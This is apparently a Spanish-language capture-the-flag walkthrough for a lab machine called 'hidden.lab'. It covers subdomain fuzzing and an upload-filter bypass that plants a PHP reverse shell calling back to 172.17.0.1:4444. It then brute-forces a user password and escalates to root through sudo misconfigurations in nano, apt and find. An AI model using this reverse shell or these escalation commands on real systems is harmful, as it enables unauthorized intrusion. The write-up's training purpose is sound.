## Reconocimiento:

Puerto 80 : HTTP

Con nmap encuentro un dominio:

```bash
http://hidden.lab
```

En la web no encuentro nada así que pruebo fuzzear subdominios:

```bash
fuff -c -w /dirb/big.txt -u http://hidden.lab -H “Host: FUZZ.hidden.lab” -fw 20
```

Encuentro “dev”

```bash
http://dev.hidden.lab
```

Hay una sección para subir archivos pdf.

Encuentro el bypass simplemente agregando la extensión pdf al archivo con la shell en php. Pero al ejecutarlo no pasa nada, solo lo abre y no hay conexión. Intento con un archivo phtml y funciona correctamente.

```bash
<?php
$sock=fsockopen("172.17.0.1",4444);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Y ejecuto:

```bash
http://dev.hidden.lab/uploads/shell.phtml
```

## Escalada www-data → cafetero

No encuentro nada interesante en el servidor así que voy a hacer un ataque de Fuerza Bruta desde la máquina víctima:

```bash
head -1000 /usr/share/wordlists/rockyou.txt
## Lo pego en un archivo en el directorio /tmp
```

Luego creo otro archivo con la herramienta que voy a utilizar:

https://github.com/Maalfer/Sudo_BruteForce/blob/main/Linux-Su-Force.sh

```bash
bash script.sh cafetero dic.txt
## Info:
Contraseña encontrada para el usuario cafetero: 123123
```

## Escalada cafetero → john

```bash
sudo -l
(john) NOPASSWD: /usr/bin/nano
```

Consulto GTFObins:

```bash
sudo -u john nano

#Dentro del nano
Ctrl^R Ctrl^X #(Esto te habrira una linea de comandos dentro del nano)
reset; sh 1>&0 2>&0
```

## Escalada john → bobby

```bash
sudo -l
(bobby) NOPASSWD: /usr/bin/apt
```

Otra vez GTFObins:

```bash
sudo -u bobby /usr/bin/apt changelog apt

!/bin/sh
```

## Escalada bobby → root

```bash
sudo -l
(root) NOPASSWD: /usr/bin/find
```

Otra vez GTFObins for the win:

```bash
sudo -u root /usr/bin/find . -exec /bin/bash -p \; -quit
```

Listo.
